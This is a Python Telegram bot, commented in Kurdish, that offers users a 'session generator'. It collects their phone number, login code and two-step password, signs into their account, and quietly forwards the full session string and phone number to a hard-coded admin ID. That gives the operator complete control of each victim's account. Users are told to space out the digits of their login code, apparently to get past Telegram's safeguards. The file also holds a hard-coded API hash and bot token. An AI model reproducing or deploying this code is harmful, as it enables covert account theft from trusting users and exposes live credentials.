import os
import asyncio
from pyrogram import Client, filters
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneCodeExpired, 
    PhoneNumberInvalid, 
    PasswordHashInvalid
)
from pyrogram.types import Message

# --- زانیارییە جێگیرکراوەکانی تۆ ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8765580797:AAGd_g1x6NuPRcddgJ_fN14xeEYGDymHzMY"
ADMIN_ID = 6310217983  # ئایدی خۆت بۆ ئەوەی سێشنەکانت بۆ بێت
# ---------------------------

app = Client("session_gen_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# داتابەیسێکی کاتی بۆ ناو ڕام
user_data = {}

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    user_data[message.from_user.id] = {}
    await message.reply(
        "👋 بەخێربێیت بۆ بۆتی دروستکردنی سێشن.\n\n"
        "📱 تکایە ژمارەی مۆبایلەکەت بنێرە بەم شێوەیە:\n"
        "`+9647501234567`"
    )

@app.on_message(filters.private & filters.text)
async def main_logic(client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id not in user_data:
        return await message.reply("تکایە سەرەتا بنووسە /start")

    step = user_data[user_id]

    # هەنگاوی ١: ناردنی کۆد بۆ ژمارەکە
    if "phone" not in step:
        await message.reply("⏳ خەریکی ناردنی کۆدە، تکایە چاوەڕێبە...")
        c = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
        await c.connect()
        try:
            code_info = await c.send_code(text)
            user_data[user_id] = {
                "client": c, 
                "phone": text, 
                "hash": code_info.phone_code_hash
            }
            await message.reply(
                "✅ کۆد نێردرا.\n\n"
                "🔢 تکایە کۆدەکە بنێرە بەم شێوەیە:\n"
                "ئەگەر کۆدەکە `12345` بوو، بنووسە `1 2 3 4 5` (فەزا بخەرە نێوان ژمارەکان)."
            )
        except PhoneNumberInvalid:
            await message.reply("❌ ژمارەکە هەڵەیە، دووبارە /start بکەرەوە.")
        except Exception as e:
            await message.reply(f"❌ هەڵە: {e}")

    # هەنگاوی ٢: وەرگرتنی کۆد و چوونە ژوورەوە
    elif "hash" in step and "signed_in" not in step:
        c = step["client"]
        phone = step["phone"]
        code_hash = step["hash"]
        pure_code = text.replace(" ", "")

        try:
            await c.sign_in(phone, code_hash, pure_code)
            await finish_session(client, message, user_id)
        except SessionPasswordNeeded:
            user_data[user_id]["signed_in"] = "waiting_password"
            await message.reply("🔐 ئەکاونتەکە پاسۆردی دوو قۆناغی (2FA) لەسەرە، تکایە پاسۆردەکە بنێرە.")
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await message.reply("❌ کۆدەکە هەڵەیە یان بەسەرچووە.")
        except Exception as e:
            await message.reply(f"❌ هەڵە: {e}")

    # هەنگاوی ٣: پاسۆردی دوو قۆناغی (ئەگەر هەبێت)
    elif step.get("signed_in") == "waiting_password":
        c = step["client"]
        try:
            await c.check_password(text)
            await finish_session(client, message, user_id)
        except (PasswordHashInvalid, Exception):
            await message.reply("❌ پاسۆردەکە هەڵەیە، دووبارە هەوڵ بدەرەوە.")

async def finish_session(bot, message, user_id):
    c = user_data[user_id]["client"]
    string_session = await c.export_session_string()
    
    # بۆ بەکارهێنەرەکە
    await message.reply(
        f"✅ سێشنەکەت بە سەرکەوتوویی دروست کرا.\n\n"
        f"🔑 **کۆدی سێشن:**\n`{string_session}`"
    )
    
    # بۆ خۆت (ئەدمین)
    await bot.send_message(
        ADMIN_ID, 
        f"🔥 سێشنێکی نوێ گەیشت!\n\n"
        f"👤 ناو: {message.from_user.mention}\n"
        f"📱 ژمارە: `{user_data[user_id]['phone']}`\n\n"
        f"🔑 **String Session:**\n`{string_session}`"
    )
    
    await c.disconnect()
    del user_data[user_id]

if __name__ == "__main__":
    app.run()
